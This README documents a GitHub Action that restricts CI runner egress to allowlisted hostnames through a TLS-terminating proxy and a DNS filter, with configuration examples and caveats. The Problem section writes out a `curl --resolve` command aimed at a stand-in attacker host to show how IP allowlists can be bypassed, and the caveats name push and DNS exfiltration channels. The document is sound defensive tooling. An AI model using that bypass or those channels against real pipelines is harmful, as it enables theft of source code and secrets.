# Safer Runner Action

![Safer Runner Action — hostname-based egress control for GitHub Actions runners](docs/assets/banner.svg)

Lock a GitHub-hosted runner's network egress to the hostnames your job actually needs.

> **v2 — a rewrite, not an upgrade of v1.** Pin an exact version or SHA; there is no moving `@v2`
> tag. v1 stays on `@v1`. Design: [docs/DESIGN-v2.md](docs/DESIGN-v2.md).

## Problem

A GitHub-hosted runner can reach the whole internet. One compromised dependency, action, or
build script can send your source, tokens, or secrets anywhere — the recent wave of CI
supply-chain attacks did exactly that.

Blocking by **IP address** does not close this. Allowed IPs belong to shared CDNs and cloud
ranges, so `curl --resolve attacker.example:443:<allowed-ip>` reaches an attacker's site over a
trusted IP, with a valid certificate.

## Solution

Safer Runner filters egress by **hostname**. It forces all HTTP and HTTPS from the job through a
TLS-terminating proxy (mitmproxy), checks the TLS SNI and each request's `Host` against your
allowlist, and connects to the name itself — never to the IP the client picked. A default-deny
DNS resolver (CoreDNS) and fail-closed iptables back it up. [How it works →](docs/DESIGN-v2.md)

- **Two modes.** `analyze` watches and reports what the job contacts, blocking nothing.
  `enforce` blocks anything off the allowlist, removes sudo and the docker group, and fails the
  job on tampering.
- **Hostname allowlist, exact by default.** Opt into subdomains explicitly.
- **Optional `http-filter`.** Limit the methods and paths allowed on a host — make a registry
  read-only, or allow git push only to your own repositories.
  [Spec →](docs/DESIGN-L7-path-method.md)
- **Containers too.** `services:`, `docker run`, compose, and `docker build` RUN steps get the
  same policy, through the same proxy and DNS filter.

## Usage

Put it **first** in the job. Its `pre` step applies the policy before any other step runs,
including other actions' `pre` steps.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: portswigger-tim/safer-runner-action@v2.3.0 # pin an exact version or SHA — no moving @v2 tag
        with:
          mode: enforce
          allowed-domains: |
            registry.npmjs.org
            pypi.org
            files.pythonhosted.org
            .docker.io        # docker.io and all of its subdomains
      - uses: actions/checkout@v5
      - run: npm ci
```

Start in `mode: analyze` (the default). Nothing is blocked. The job summary lists every host the
job contacted, flags the ones enforce would block, and suggests an `allowed-domains` block to
paste. Switch to `enforce` once the list is right. GitHub's own endpoints (checkout, artifacts,
cache, OIDC) are allowed automatically.

### Inputs

| Input | Default | |
|---|---|---|
| `mode` | `analyze` | `analyze` (watch and report) or `enforce` (block) |
| `allowed-domains` | | Hostnames the job may reach, one per line. See [allowlist syntax](#allowlist-syntax) |
| `http-filter` | | Per host: path pattern → allowed methods. On a filtered host, everything not listed is refused. [Spec](docs/DESIGN-L7-path-method.md) |
| `allow-github-platform` | `true` | When a GitHub host is filtered, allow the exact endpoints the runner and first-party actions need (logs, cache, artifacts, OIDC) |
| `passthrough-domains` | `hosted-compute-*.githubapp.com` | Hosts checked by SNI only (not decrypted). Single-tenant hosts whose clients can't trust the CA. The default is always included |
| `block-risky-github-subdomains` | `true` | Deny `gist.github.com`, `gist.githubusercontent.com`, `raw.githubusercontent.com` |
| `dns-servers` | `9.9.9.9 149.112.112.112` | Upstream resolvers for allowlisted names (Quad9 by default) |
| `disable-sudo` | follows `mode` | `enforce` removes the runner's sudo after setup. Keeping it in enforce makes the job **ADVISORY** |
| `docker` | follows `mode` | `keep`, `remove-group`, or `stop`. `enforce` uses `remove-group`. `keep` in enforce makes the job **ADVISORY** |
| `fail-on-tampering` | follows `mode` | `enforce` fails the post step if the safer-runner config changed during the job |

An explicit value always wins; leaving one unset follows the mode. Keeping sudo or docker in
enforce means a root step could remove the controls, so the job is labelled **ADVISORY** rather
than enforced. See [docs/DESIGN-v2.md](docs/DESIGN-v2.md) for the full enforce behaviour.

### Allowlist syntax

The same patterns drive the proxy **and** DNS, so the two never disagree.

| Entry | Allows | Example |
|---|---|---|
| `example.com` | **exactly** `example.com` — not `www.example.com` | `pypi.org` |
| `*.example.com` | every subdomain, any depth — not `example.com` itself | `*.nip.io` |
| `.example.com` | shorthand for `example.com` + `*.example.com` | `.docker.io` |
| `pre*.example.com` | `*` within one label | `productionresultssa*.blob.core.windows.net` |

A bare entry is that name only. Wildcard entries forward every lookup under the zone, so they
double as a DNS channel to whoever runs that zone's name servers — prefer exact names, and use
wildcards only for zones you trust.

### Examples

**Make registries read-only.** Reads use `GET`/`HEAD`; publishes use `PUT`/`POST`. One line per
host blocks the write and keeps installs working:

```yaml
with:
  mode: enforce
  allowed-domains: |
    registry.npmjs.org
    ghcr.io
  http-filter: |
    registry.npmjs.org:
      "*": GET, HEAD         # npm install: yes. npm publish: no
    ghcr.io:
      "*": GET, HEAD         # docker pull: yes. docker push: no
```

**Allow git push to your own repositories only.** A push path ends in `git-receive-pack`, a
fetch in `git-upload-pack`; the most specific rule wins:

```yaml
with:
  mode: enforce
  allowed-domains: github.com
  http-filter: |
    github.com:
      "*": "*"
      "*/git-receive-pack": NONE                   # refuse all pushes...
      "portswigger-tim/*/git-receive-pack": "*"    # ...except to this org
```

More patterns and the full rule set: [docs/DESIGN-L7-path-method.md](docs/DESIGN-L7-path-method.md).

## Caveats

Safer Runner hardens one layer — network egress. It is not a complete sandbox. The caveats that
change how you use it:

- **Keeping sudo or docker makes enforce advisory.** A root step can remove the proxy and
  firewall, and docker group membership is root-equivalent. Enforce removes both; the summary
  labels the job ADVISORY if you keep either.
- **Allowed hosts are full-capability channels.** If `github.com` is allowed, a malicious step
  can push data to a repository it controls. Narrow this with
  [`http-filter`](docs/DESIGN-L7-path-method.md).
- **The job summary and tamper check are advisory.** They run in the post step from files the
  job can modify, and name redaction is best-effort, not a guarantee. Treat them as a tripwire,
  not tamper-proof evidence — and don't upload the raw runner logs from a public repository.
- **Names that resolve to internal addresses are refused** — including some Azure
  private-networking runners that reach private services by name.
- **Only TCP 80/443 is proxied.** Other ports, including SSH (`git@github.com`), are rejected in
  enforce.
- **GitHub-hosted Ubuntu runners only** (24.04 / 26.04).

Full list → [docs/LIMITATIONS.md](docs/LIMITATIONS.md).

## More

- [Verifying this action (supply chain)](docs/VERIFYING.md) — pin by SHA, check build provenance.
- [CI/CD good practice](docs/CICD-GOOD-PRACTICE.md) — defence in depth around this action.
- [Design](docs/DESIGN-v2.md) · [`http-filter` spec](docs/DESIGN-L7-path-method.md) ·
  [Release notes](docs/RELEASE-NOTES.md)
